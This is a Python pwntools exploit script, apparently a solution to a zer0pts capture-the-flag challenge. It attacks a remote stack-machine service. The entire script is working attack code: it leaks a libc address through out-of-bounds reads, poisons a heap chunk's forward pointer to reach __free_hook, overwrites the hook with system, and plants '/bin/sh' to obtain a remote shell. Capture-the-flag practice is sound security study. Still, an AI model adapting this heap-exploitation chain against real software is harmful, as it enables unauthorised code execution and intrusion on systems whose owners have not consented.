from pwn import *
from time import sleep

#r = process(['./ld-2.31.so', './chall'], env={'LD_PRELOAD':'./libc.so.6 /usr/lib/x86_64-linux-gnu/libstdc++.so.6 /lib/x86_64-linux-gnu/libgcc_s.so.1 /lib/x86_64-linux-gnu/libm.so.6'}) 
r = remote('pwn.ctf.zer0pts.com', 9001)
u = 0.0001

def push(val):
    sleep(u)
    r.sendlineafter('>>', '1')
    sleep(u)
    r.sendlineafter('value', str(val))

def pop():
    sleep(u)
    r.sendlineafter('>>', '2') 

def store(idx, val):
    sleep(u)
    r.sendlineafter('>>', '3')
    sleep(u) 
    r.sendlineafter('index', str(idx))
    sleep(u)
    r.sendlineafter('value', str(val))

def load(idx):
    sleep(u)
    r.sendlineafter('>>', '4')
    sleep(u)
    r.sendlineafter('index', str(idx))
    sleep(u)
    r.recvuntil('value: ')
    return r.recvline()[:-1]

def wipe(): r.sendlineafter('>>', '5')

def main():
    # for libc_leak
    for i in range(550):
        print(i)
        push(i)
    wipe()
    push(1)
    for i in range(550):
        print(i)
        pop()
    libc_under = hex(int(load(544)))[2:]
    libc_upper = hex(int(load(545)))[2:]
    libc_tmp = "0x{}{}".format(libc_upper, libc_under)
    libc_base = int(libc_tmp, 16) - 0x1ebbe0
    free_hook = libc_base + 0x1eeb28
    under = hex(free_hook)[-8:]
    upper = hex(free_hook)[2:-8]
    wipe()

    # overwrite fd to __free_hook
    for i in range(5):
        print(i)
        push(1)
    for i in range(100):
        print(i)
        pop()
    def htoi(hexa):
        if int(hexa[0], 16) < 8:
            return int(hexa, 16)
        else:
            return int(hexa, 16) - pow(16, len(hexa))
    # overwrite here.
    store(-16, htoi(under)) #0x20 chunk fd
    store(-15, int(upper, 16)) #0x20 chunk fd
    wipe()
    system = libc_base + 0x55410 
    under = hex(system)[6:]
    upper = hex(system)[:6]

    # __free_hook overwrite to system
    push(htoi(under)) 
    push(int(upper, 16)) 
    wipe()
    # free("/bin/sh") => system("/bin/sh"). for it, set /bin/sh to chunk top
    for i in range(1):
        push(1852400175) #/bin
        push(6845231) #/shÂ¥x00

    # run system("/bin/sh")
    push(1)
    r.interactive()

if __name__ == '__main__':
    main()
